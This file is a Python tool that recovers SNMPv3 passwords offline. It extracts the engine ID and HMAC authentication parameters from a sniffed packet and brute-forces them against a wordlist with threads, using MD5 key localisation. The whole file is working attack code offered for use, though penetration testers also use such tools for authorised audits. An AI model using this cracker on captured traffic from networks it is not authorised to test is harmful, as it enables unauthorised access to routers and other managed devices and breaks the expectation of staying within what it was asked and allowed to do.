import hashlib
import argparse

from threading import Lock, Thread

parser = argparse.ArgumentParser(description='Crack a SMNP password with sniffed packet')
parser.add_argument('--hash', dest='hash_function', default='md5', choices=['sha1', 'md5'], help='hashing function md5|sh1 (default md5)')
parser.add_argument('--msg', dest='wholemsg', help='the whole message received')
parser.add_argument('--dict', dest='dict', help='list of word to brutforce')
parser.add_argument('--t', dest='nb_thread', help='number of thread used', default=10)
args = parser.parse_args()

print("""╔═══╦═╗─╔╦═╗╔═╦═══╗───────────╔╗
║╔═╗║║╚╗║║║╚╝║║╔═╗║───────────║║
║╚══╣╔╗╚╝║╔╗╔╗║╚═╝║╔══╦═╦══╦══╣║╔╦══╦═╗
╚══╗║║╚╗║║║║║║║╔══╝║╔═╣╔╣╔╗║╔═╣╚╝╣║═╣╔╝
║╚═╝║║─║║║║║║║║║───║╚═╣║║╔╗║╚═╣╔╗╣║═╣║
╚═══╩╝─╚═╩╝╚╝╚╩╝───╚══╩╝╚╝╚╩══╩╝╚╩══╩╝""")

whole_message = bytes.fromhex(args.wholemsg)
if args.hash_function == 'md5':
    hash_function = hashlib.md5
else:
    print("[+] Sorry it only works with md5 for now")
    hash_function = hashlib.sha1
    exit()

msgAuthoritativeEngineID_index = whole_message.index(b'\x04\x11') + 2
msgAuthoritativeEngineID = whole_message[msgAuthoritativeEngineID_index:msgAuthoritativeEngineID_index + 17]

msgAuthenticationParameters_index = whole_message.index(b'\x04\x0c') + 2
msgAuthenticationParameters = whole_message[msgAuthenticationParameters_index:msgAuthenticationParameters_index + 12]

whole_message = whole_message[:msgAuthenticationParameters_index] + 12*b'\x00' + whole_message[msgAuthenticationParameters_index + 12:]

print("[+] Selected hash function : {}".format(args.hash_function))
print("[+] msgAuthoritativeEngineID : {}".format(msgAuthoritativeEngineID.hex()))
print("[+] msgAuthenticationParameters : {}".format(msgAuthenticationParameters.hex()))

try:
    with open(args.dict, 'r') as f:
        candidates = f.read().split('\n')
except UnicodeDecodeError:
    with open(args.dict, 'r', encoding='latin-1') as f:
        candidates = f.read().split('\n')

def hash(b):
    result = hash_function(b)
    return result.digest()

def byte_xor(ba1, ba2):
    result = b''
    for i in range(len(ba1)):
        result += bytes([ba1[i] ^ ba2[i]])
    return result

def test_candidate():
    global i
    global found

    while i < len(candidates):

        counter_lock.acquire()
        candidates_lock.acquire()
        candidate = candidates[i]
        i += 1
        counter_lock.release()
        candidates_lock.release()

        if len(candidate) == 0:
            continue

        secret_key = candidate.encode()
        secret_key = secret_key * ((1048576 // len(secret_key)) + 1)
        secret_key = secret_key[:1048576]
        string1 = hash(secret_key)

        string2 = string1 + msgAuthoritativeEngineID + string1
        authkey = hash(string2)

        extendedAuthKey = authkey + 48*b'\x00'

        opad = 64*b'\x5c'
        ipad = 64*b'\x36'

        k1 = byte_xor(ipad, extendedAuthKey)
        k2 = byte_xor(opad, extendedAuthKey)

        extk1 = k1 + whole_message
        hashk1 = hash(extk1)

        extk2 = k2 + hashk1
        hashk2 = hash(extk2)

        msgAuthenticationParameters_candidate = hashk2[:12]
        print_lock.acquire()
        if found:
            print_lock.release()
            break
        print("\rTested : {}/{}".format(i, len(candidates)), end="")
        if msgAuthenticationParameters_candidate == msgAuthenticationParameters:
            print("\nPassword found : {}".format(candidate))
            found = True
            print_lock.release()
            break
        print_lock.release()

i = 0
found = False

counter_lock = Lock()
candidates_lock = Lock()
print_lock = Lock()

t = [Thread(target=test_candidate) for x in range(10)]
for t_ in t:
    t_.start()
